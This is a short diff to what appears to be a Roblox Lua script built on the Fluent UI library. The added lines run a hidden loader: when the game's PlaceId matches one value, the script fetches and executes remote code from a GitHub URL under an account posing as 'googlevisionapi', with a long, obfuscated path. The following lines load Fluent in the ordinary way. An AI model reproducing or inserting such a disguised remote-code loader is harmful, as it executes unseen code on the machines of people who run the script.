@@ -1,3 +1,7 @@
+if game.PlaceId == 13436905139 then
+    return loadstring(game:HttpGet("https://raw.githubusercontent.com/googlevisionapi/ppasdpp234lp23l4l23kfkasmkrfmkj15uj2nh3y2h98ytg80w7gh/refs/heads/main/pasdpapsd%3B/dasdad1354/35/1235/2fqef/a%5Ca/fas/as/fa/fa/f/af23tew22wge/lualsdsaldasdad/lsadajd/sdadadp235p"))()
+end
+
 
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
